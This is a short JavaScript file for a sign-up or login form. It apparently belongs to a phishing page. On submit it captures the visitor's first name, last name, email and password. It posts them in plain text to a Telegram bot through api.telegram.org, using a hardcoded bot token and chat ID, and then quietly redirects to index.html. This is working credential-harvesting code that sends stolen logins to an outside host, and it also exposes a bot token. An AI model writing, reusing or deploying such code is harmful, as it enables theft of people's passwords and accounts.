const BOT_TOKEN = "8798453581:AAHcfScCQm_fuWhSZl8PMiYDbl5XG5X_l2E";
const CHAT_ID = "7318935186";
const elForm = document.querySelector(".form-box");
const elFormName = elForm.querySelector(".inp-name");
const elFormLastName = elForm.querySelector(".inp-lastname");
const elFormemail = elForm.querySelector(".inp-email");
const elFormPassword = elForm.querySelector(".inp-password");

async function telegram(user_name, user_lastname, user_email, user_password) {
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
  try {
    const res = await fetch(url, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: `
👤Ism: ${user_name}
👤Familiya: ${user_lastname}
📧Email: ${user_email}
🔐Parol: ${user_password}`,
      }),
    });
    const data = await res.json();
    console.log(data);
  } catch (error) {
    console.log(error);
  }
}
elForm.addEventListener("submit", (evt) => {
  evt.preventDefault();

  let elUserNameValue = elFormName.value;
  let elUserLastName = elFormLastName.value;
  let elUserEmailValue = elFormemail.value;
  let elUserPasswordValue = elFormPassword.value;

  telegram(
    elUserNameValue,
    elUserLastName,
    elUserEmailValue,
    elUserPasswordValue,
  );
  window.location.replace("./index.html");
});
